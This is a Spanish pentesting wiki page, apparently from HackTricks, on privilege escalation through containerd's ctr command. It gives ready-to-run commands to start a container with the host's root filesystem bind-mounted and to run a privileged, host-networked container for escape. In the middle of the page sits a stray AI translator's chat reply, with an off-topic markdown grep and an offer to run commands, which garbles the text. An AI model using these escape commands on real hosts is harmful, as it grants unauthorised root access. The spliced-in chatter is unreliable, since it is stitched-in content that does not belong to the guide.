# Containerd (ctr) Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Información básica

Ve al siguiente enlace para aprender **dónde encajan `containerd` y `ctr` en la pila de contenedores**:


{{#ref}}
container-security/runtimes-and-engines.md
{{#endref}}

## PE 1

si encuentras que un host contiene el comando `ctr`:
```bash
which ctr
/usr/bin/ctr
```
¿Te refieres a listar imágenes en containerd/ctr? Aquí tienes comandos útiles (no traduzco los comandos/código):

- Listar imágenes con ctr (espacio de nombres por defecto):
  ctr images ls

- Listar imágenes en un namespace concreto (p. ej. k8s.io):
  ctr -n k8s.io images ls

- Mostrar solo los nombres (quiet):
  ctr images ls -q

- Con nerdctl (compatibilidad con docker CLI):
  nerdctl images

- Con Docker (si está presente en el host):
  docker images

- Con crictl (para runtimes CRI):
  crictl images
  crictl --output json images

- Buscar referencias en archivos Markdown del repositorio (local):
  grep -R --include="*.md" -nE '!\\[|<img' .

- Listar blobs/archivos de contenido en el almacenamiento de containerd:
  ls -la /var/lib/containerd/io.containerd.content.v1.content/blobs/sha256

Si quieres, puedo ejecutar o analizar la salida de alguno de estos comandos si pegas la salida aquí, o puedo listar imágenes referenciadas en un archivo markdown concreto si lo proporcionas.
```bash
ctr image list
REF                                  TYPE                                                 DIGEST                                                                  SIZE      PLATFORMS   LABELS
registry:5000/alpine:latest application/vnd.docker.distribution.manifest.v2+json sha256:0565dfc4f13e1df6a2ba35e8ad549b7cb8ce6bccbc472ba69e3fe9326f186fe2 100.1 MiB linux/amd64 -
registry:5000/ubuntu:latest application/vnd.docker.distribution.manifest.v2+json sha256:ea80198bccd78360e4a36eb43f386134b837455dc5ad03236d97133f3ed3571a 302.8 MiB linux/amd64 -
```
Y luego **ejecuta una de esas imágenes montando en ella la carpeta raíz del host**:
```bash
ctr run --mount type=bind,src=/,dst=/,options=rbind -t registry:5000/ubuntu:latest ubuntu bash
```
## PE 2

Ejecuta un contenedor privileged y escapa de él.\
Puedes ejecutar un contenedor privileged como:
```bash
ctr run --privileged --net-host -t registry:5000/modified-ubuntu:latest ubuntu bash
```
A continuación puedes usar algunas de las técnicas mencionadas en la siguiente página para **escapar de él abusando de capacidades privilegiadas**:


{{#ref}}
container-security/
{{#endref}}

{{#include ../../banners/hacktricks-training.md}}
